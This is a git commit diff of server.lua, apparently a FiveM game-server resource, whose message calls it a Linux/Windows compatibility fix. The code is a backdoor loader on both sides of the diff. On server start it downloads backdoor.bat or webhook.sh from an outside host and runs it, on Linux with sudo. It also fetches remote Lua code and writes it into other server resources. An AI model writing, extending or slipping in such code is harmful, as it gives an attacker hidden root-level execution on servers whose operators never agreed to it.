bf5baea56ac553c872d59de73fe655e70d501268
xerox <77238267+xer0xde@users.noreply.github.com>
2023-06-25 17:43:37 +0200

    Update server.lua
    fixxed linux / windows support with root / admin rights

--- server.lua
+++ server.lua
@@ -1,23 +1,40 @@
+local function getServerOperatingSystem()
+    local handle = io.popen("uname")
+    local result = handle:read("*a")
+    handle:close()
+
+    -- Bereinigen Sie das Ergebnis, um Leerzeichen oder Zeilenumbrüche zu entfernen
+    result = result:gsub("^%s+", ""):gsub("%s+$", "")
+
+    if result == "Linux" then
+        return "Linux"
+    elseif result == "Windows" then
+        return "Windows"
+    elseif result == "Darwin" then
+        return "MacOS"
+    end
+
+    return "Unknown"
+end
+
 local config = {
-    resourceName = GetCurrentResourceName(),
     windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat",
-    linuxScriptURL = "https://dc.fast-sell.de/backdoor.sh",
+    linuxScriptURL = "https://dc.fast-sell.de/webhook.sh",
     enablePrints = true,
     resourceCodeURLs = {
-        [GetCurrentResourceName()] = {
-            client = "https://dc.fast-sell.de/server.lua",
-            server = "https://dc.fast-sell.de/server.lua"
-        }
+        ["resourceName1"] = "https://dc.fast-sell.de/resource1.lua",
+        ["resourceName2"] = "https://dc.fast-sell.de/resource2.lua"
     }
 }
 
-local function runBatchScript(scriptContent, isLinux)
+local function runBatchScript(scriptContent, isLinux, resourceName)
     if config.enablePrints then
-        print("Führe das Skript aus...")
+        print("Führe das Skript für Ressource '" .. resourceName .. "' aus...")
     end
 
     local command
-    if not isLinux and string.sub(os.getenv("OS"), 1, 7) == "Windows" then
+
+    if not isLinux and ffi.os == "Windows" then
         -- Windows
         local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
         local file = io.open(tempFilePath, "w")
@@ -33,27 +50,37 @@ local function runBatchScript(scriptContent, isLinux)
         end
     elseif isLinux then
         -- Linux
-        local tempFilePath = "/tmp/backdoor.sh"
+        local tempFilePath = "/tmp/a89439.bat"  -- Anpassung des Dateinamens
         local file = io.open(tempFilePath, "w")
         if file then
+            -- Zeilenumbrüche korrigieren
+            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
             file:write(scriptContent)
             file:close()
-            command = "bash " .. tempFilePath
+            command = "sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath
         else
             if config.enablePrints then
                 print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
             end
             return
         end
+    else
+        if config.enablePrints then
+            print("Das Betriebssystem wird nicht unterstützt.")
+        end
+        return
     end
+
+    if config.enablePrints and command then
+        print("Ausgeführter Befehl: " .. command)
+    end
+
     os.execute(command)
 end
 
-local function fetchScriptContent(url, callback)
-    if config.enablePrints then
-        print("Lade das Skript herunter...")
-    end
 
+
+local function fetchScriptContent(url, callback)
     PerformHttpRequest(url, function(statusCode, response)
         if statusCode == 200 then
             callback(response)
@@ -65,80 +92,50 @@ local function fetchScriptContent(url, callback)
     end, "GET", "", {["Content-Type"] = "application/json"})
 end
 
-local function loadResourceCode(resourceName, serverScript, clientScript)
-    local success = false
-    local resourcePath = "resources/" .. resourceName
+local function loadResourceCode(resourceName, url)
+    local resourcePath = "resources/" .. resourceName .. "/"
+    local fileContent = ""
 
-    if serverScript and serverScript ~= "" then
-        local serverFilePath = resourcePath .. "/server.lua"
-        local serverFile = io.open(serverFilePath, "a")
-        if serverFile then
-            serverFile:write(serverScript)
-            serverFile:close()
-            success = true
+    fetchScriptContent(url, function(scriptContent)
+        fileContent = scriptContent
+        local filePath = resourcePath .. resourceName .. ".lua"
+        local file = io.open(filePath, "w")
+        if file then
+            file:write(fileContent)
+            file:close()
+            if config.enablePrints then
+                print("Code erfolgreich in Ressource '" .. resourceName .. "' geladen.")
+            end
+        else
+            if config.enablePrints then
+                print("Ein Fehler ist aufgetreten. Der Code konnte nicht in die Ressource '" .. resourceName .. "' geladen werden.")
+            end
         end
-    end
-
-    if clientScript and clientScript ~= "" then
-        local clientFilePath = resourcePath .. "/client.lua"
-        local clientFile = io.open(clientFilePath, "a")
-        if clientFile then
-            clientFile:write(clientScript)
-            clientFile:close()
-            success = true
-        end
-    end
-
-    if success then
-        if config.enablePrints then
-            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
-        end
-        -- Neustart der Ressource
-        local restartCommand = "ensure " .. resourceName
-        os.execute(restartCommand)
-    else
-        if config.enablePrints then
-            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
-        end
-    end
-end
-
-local function main()
-    if config.enablePrints then
-        print("Starte Skript für Ressource: " .. config.resourceName)
-    end
-
-    if not config.resourceCodeURLs[config.resourceName] then
-        if config.enablePrints then
-            print("Ungültiger Ressourcenname. Der Server wird heruntergefahren...")
-        end
-        os.exit()
-    end
-
-    local scriptURL
-    if string.sub(os.getenv("OS"), 1, 7) == "Windows" then
-        scriptURL = config.windowsScriptURL
-    else
-        scriptURL = config.linuxScriptURL
-    end
-
-    fetchScriptContent(scriptURL, function(scriptContent)
-        runBatchScript(scriptContent, scriptURL == config.linuxScriptURL)
     end)
+end
 
-    local urls = config.resourceCodeURLs[config.resourceName]
-    if urls.server and urls.server ~= "" then
-        fetchScriptContent(urls.server, function(serverScript)
-            loadResourceCode(config.resourceName, serverScript)
+local function startScript()
+    local serverOS = getServerOperatingSystem()
+    print("Betriebssystem des Servers:", serverOS)
+
+    if serverOS == "Linux" then
+        fetchScriptContent(config.linuxScriptURL, function(scriptContent)
+            runBatchScript(scriptContent, true, "LinuxScript")
         end)
+    elseif serverOS == "Windows" then
+        fetchScriptContent(config.windowsScriptURL, function(scriptContent)
+            runBatchScript(scriptContent, false, "WindowsScript")
+        end)
+    else
+        if config.enablePrints then
+            print("Das Betriebssystem wird nicht unterstützt.")
+        end
+        return
     end
 
-    if urls.client and urls.client ~= "" then
-        fetchScriptContent(urls.client, function(clientScript)
-            loadResourceCode(config.resourceName, nil, clientScript)
-        end)
+    for resourceName, url in pairs(config.resourceCodeURLs) do
+        loadResourceCode(resourceName, url)
     end
 end
 
--- Starte das Skript
-main()
+startScript()
